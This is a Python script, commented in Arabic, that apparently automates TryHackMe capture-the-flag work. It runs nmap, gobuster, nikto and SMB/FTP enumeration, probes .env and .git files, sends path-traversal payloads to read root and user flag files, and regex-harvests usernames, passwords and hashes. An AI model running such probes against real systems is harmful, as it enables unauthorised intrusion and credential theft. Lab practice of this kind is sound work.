import subprocess
import re
import os
import sys
import time
import concurrent.futures
import threading
import json
from datetime import datetime
from pathlib import Path

# ======================= الإعدادات =======================
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BLUE = '\033[94m'
CYAN = '\033[96m'
END = '\033[0m'
BOLD = '\033[1m'

print_lock = threading.Lock()
def safe_print(*args, **kwargs):
    with print_lock:
        print(*args, **kwargs)

class THMUniversalSolver:
    def __init__(self, target_ip):
        self.ip = target_ip
        self.results = {
            "ports": [],
            "services": {},
            "web_techs": [],
            "directories": [],
            "cms": None,
            "usernames": set(),
            "passwords": set(),
            "hashes": set(),
            "flags": set(),
            "potential_answers": {}
        }
        self.session_dir = f"THM_Universal_{target_ip}_{int(time.time())}"
        Path(self.session_dir).mkdir(parents=True, exist_ok=True)
        self.executed_commands = set()
        self.found_anything = False
        self.start_time = time.time()

    def log(self, msg, color=BLUE):
        timestamp = datetime.now().strftime("%H:%M:%S")
        safe_print(f"{color}[{timestamp}] {msg}{END}")

    def run_cmd(self, cmd, timeout=120):
        """تنفيذ أمر واحد وتسجيل المخرجات"""
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                           text=True, timeout=timeout)
            # حفظ المخرجات في ملف
            safe_name = cmd.replace(' ', '_').replace('/', '_').replace(':', '_')[:50]
            with open(f"{self.session_dir}/{safe_name}.txt", 'a', encoding='utf-8') as f:
                f.write(f"# {datetime.now().isoformat()}\n{cmd}\n\n{result}\n\n{'-'*50}\n")
            return result
        except subprocess.TimeoutExpired:
            return ""
        except Exception:
            return ""

    def run_parallel(self, cmds, max_workers=10, timeout=120):
        """تنفيذ أوامر متعددة بالتوازي"""
        results = {}
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_cmd = {executor.submit(self.run_cmd, cmd, timeout): cmd for cmd in cmds}
            for future in concurrent.futures.as_completed(future_to_cmd):
                cmd = future_to_cmd[future]
                try:
                    results[cmd] = future.result()
                except Exception:
                    results[cmd] = ""
        return results

    # ==================== مراحل الفحص ====================

    def phase1_nmap_quick(self):
        """فحص nmap سريع لأشهر 1000 منفذ"""
        self.log("🔍 [1] فحص nmap سريع (أشهر 1000 منفذ)...", CYAN)
        output = self.run_cmd(f"nmap -F -sV -T4 {self.ip}", timeout=300)
        if output:
            for line in output.split('\n'):
                m = re.search(r'(\d+)/tcp\s+open\s+(\S+)', line)
                if m:
                    port, svc = int(m.group(1)), m.group(2)
                    self.results["ports"].append(port)
                    self.results["services"][port] = svc
                    self.log(f"  🔓 منفذ {port}: {svc}", GREEN)

    def phase2_nmap_full(self):
        """إذا كان عدد المنافذ قليلاً (<10)، نفحص جميع المنافذ"""
        if len(self.results["ports"]) < 10:
            self.log("🔍 [2] فحص nmap شامل (جميع المنافذ)...", CYAN)
            output = self.run_cmd(f"nmap -sC -sV -p- -T4 {self.ip}", timeout=600)
            if output:
                self.results["ports"] = []
                self.results["services"] = {}
                for line in output.split('\n'):
                    m = re.search(r'(\d+)/tcp\s+open\s+(\S+)', line)
                    if m:
                        port, svc = int(m.group(1)), m.group(2)
                        self.results["ports"].append(port)
                        self.results["services"][port] = svc
                        self.log(f"  🔓 منفذ {port}: {svc}", GREEN)

    def phase3_web_scan(self):
        """فحص شامل لخدمات الويب"""
        web_ports = [p for p in self.results["ports"] if p in [80,443,8080,8443,8000,8888] or 'http' in self.results["services"].get(p,'')]
        if not web_ports:
            return

        self.log("🌐 [3] فحص الويب (whatweb + gobuster)...", CYAN)
        web_tasks = []
        for port in web_ports:
            protocol = 'https' if port in [443,8443] else 'http'
            web_tasks.append(f"whatweb {protocol}://{self.ip}:{port}")
            web_tasks.append(f"gobuster dir -u {protocol}://{self.ip}:{port} -w /usr/share/wordlists/dirb/common.txt -t 50")
            web_tasks.append(f"nikto -h {protocol}://{self.ip}:{port} -ssl -Tuning 123456 -nointeractive")
            web_tasks.append(f"curl -s {protocol}://{self.ip}:{port}/robots.txt")
            web_tasks.append(f"curl -s {protocol}://{self.ip}:{port}/.git/HEAD")
            web_tasks.append(f"curl -s {protocol}://{self.ip}:{port}/.env")

        results = self.run_parallel(web_tasks, max_workers=5, timeout=180)

        # تحليل النتائج
        for cmd, output in results.items():
            if not output:
                continue
            # استخراج تقنيات الويب من whatweb
            if "whatweb" in cmd:
                techs = re.findall(r'([A-Za-z0-9]+(?:-[A-Za-z0-9]+)*)\[', output)
                for tech in techs:
                    self.results["web_techs"].append(tech)
            # استخراج الدلائل من gobuster
            if "gobuster" in cmd:
                dirs = re.findall(r'/(\S+)\s+\(Status: 200\)', output)
                for d in dirs:
                    self.results["directories"].append(d)
            # استخراج CMS من whatweb أو curl
            cms_keywords = ['WordPress', 'Joomla', 'Drupal', 'Magento', 'Simple Image Gallery', 'CMS Made Simple']
            for cms in cms_keywords:
                if cms.lower() in output.lower():
                    self.results["cms"] = cms
                    break

    def phase4_service_enum(self):
        """فحص الخدمات الأخرى: FTP, SMB, SSH, SMTP, إلخ"""
        self.log("📡 [4] فحص الخدمات الإضافية...", CYAN)
        service_tasks = []

        # FTP
        if 21 in self.results["ports"]:
            service_tasks.append(f"nmap --script ftp-anon,ftp-bounce,ftp-libopie -p 21 {self.ip}")
            service_tasks.append(f"echo -e 'anonymous\\n\\nls\\nbye' | ftp -n {self.ip} 2>/dev/null | head -20")

        # SMB
        if any(p in [139,445] for p in self.results["ports"]):
            service_tasks.append(f"enum4linux -a {self.ip}")
            service_tasks.append(f"smbclient -L //{self.ip} -N")

        # SSH
        if 22 in self.results["ports"]:
            service_tasks.append(f"nmap --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -p 22 {self.ip}")

        # SMTP
        if 25 in self.results["ports"] or 587 in self.results["ports"]:
            service_tasks.append(f"nmap --script smtp-commands,smtp-enum-users -p 25,587 {self.ip}")

        # DNS
        if 53 in self.results["ports"]:
            service_tasks.append(f"dig axfr {self.ip}")

        if service_tasks:
            results = self.run_parallel(service_tasks, max_workers=4, timeout=180)
            # تحليل نتائج FTP للحصول على ملفات
            for cmd, out in results.items():
                if "ftp" in cmd and out:
                    if "230 Login successful" in out:
                        self.log("  ✅ FTP anonymous login ممكن", GREEN)
                        # محاولة سرد الملفات (قد يكون فيها شيء)
                        files = re.findall(r'^-rw-r--r--.*?(\S+)$', out, re.MULTILINE)
                        for f in files:
                            self.log(f"    📄 ملف: {f}", YELLOW)

    def phase5_password_cracking(self):
        """محاولة كسر كلمات المرور (إذا وجدنا هاشات)"""
        # هذه المرحلة تعتمد على وجود هاشات مسبقة
        pass

    def phase6_flag_hunting(self):
        """البحث عن الأعلام في مسارات شائعة"""
        self.log("🎯 [6] البحث عن الأعلام في مسارات شائعة...", CYAN)
        web_ports = [p for p in self.results["ports"] if p in [80,443,8080,8443] or 'http' in self.results["services"].get(p,'')]
        if not web_ports:
            return

        flag_paths = [
            "/flag.txt", "/root/flag.txt", "/root/root.txt", "/root.txt",
            "/home/*/flag.txt", "/home/*/user.txt", "/user.txt",
            "/.flag", "/.root.txt", "/var/www/flag.txt", "/tmp/flag.txt",
            "/secret.txt", "/.hidden/flag.txt"
        ]
        tasks = []
        for port in web_ports:
            protocol = 'https' if port in [443,8443] else 'http'
            for path in flag_paths:
                tasks.append(f"curl -s {protocol}://{self.ip}:{port}{path}")
                tasks.append(f"curl -s '{protocol}://{self.ip}:{port}/?page=../../../../..{path}'")

        # نأخذ فقط أول 50 مهمة لتجنب الإطالة
        results = self.run_parallel(tasks[:50], max_workers=10, timeout=60)
        for output in results.values():
            if output:
                # البحث عن أنماط الأعلام المعروفة
                flag_patterns = [
                    r'THM\{[^}]+\}',
                    r'flag\{[^}]+\}',
                    r'FLAG\{[^}]+\}',
                    r'G00d j0b, keep up!',
                    r'W3ll d0n3\. You made it!',
                    r'[A-Z0-9]{32}',
                    r'[a-f0-9]{32}'
                ]
                for pattern in flag_patterns:
                    matches = re.findall(pattern, output, re.IGNORECASE)
                    for m in matches:
                        self.results["flags"].add(m)
                        self.log(f"  🎯 علم محتمل: {m}", GREEN)

    def phase7_info_extraction(self):
        """استخراج المعلومات العامة من كل المخرجات"""
        self.log("📋 [7] استخراج المعلومات من جميع المخرجات...", CYAN)
        # نقرأ جميع الملفات النصية في مجلد الجلسة ونبحث عن أنماط
        for file in Path(self.session_dir).glob("*.txt"):
            try:
                content = file.read_text(encoding='utf-8', errors='ignore')
                # أسماء المستخدمين
                user_patterns = [
                    r'username:\s*(\S+)',
                    r'user:\s*(\S+)',
                    r'login:\s*(\S+)',
                    r'User:\s*(\S+)',
                    r'user name:\s*(\S+)'
                ]
                for pat in user_patterns:
                    matches = re.findall(pat, content, re.IGNORECASE)
                    for m in matches:
                        self.results["usernames"].add(m.strip())

                # كلمات المرور والهاشات
                pass_patterns = [
                    r'password:\s*(\S+)',
                    r'pass:\s*(\S+)',
                    r'([a-f0-9]{32})',  # MD5
                    r'(\$2[ayb]\$.{56})',  # bcrypt
                    r'(\$6\$.{88})'  # SHA-512
                ]
                for pat in pass_patterns:
                    matches = re.findall(pat, content, re.IGNORECASE)
                    for m in matches:
                        if len(m) > 4:
                            self.results["passwords"].add(m.strip())
                            if re.match(r'^[a-f0-9]{32}$', m, re.I):
                                self.results["hashes"].add(m)

                # الأعلام (مرة أخرى)
                flag_patterns = [
                    r'THM\{[^}]+\}',
                    r'flag\{[^}]+\}',
                    r'FLAG\{[^}]+\}',
                    r'G00d j0b, keep up!',
                    r'W3ll d0n3\. You made it!'
                ]
                for pat in flag_patterns:
                    matches = re.findall(pat, content, re.IGNORECASE)
                    for m in matches:
                        self.results["flags"].add(m)

            except Exception:
                continue

    # ==================== عرض النتائج ====================

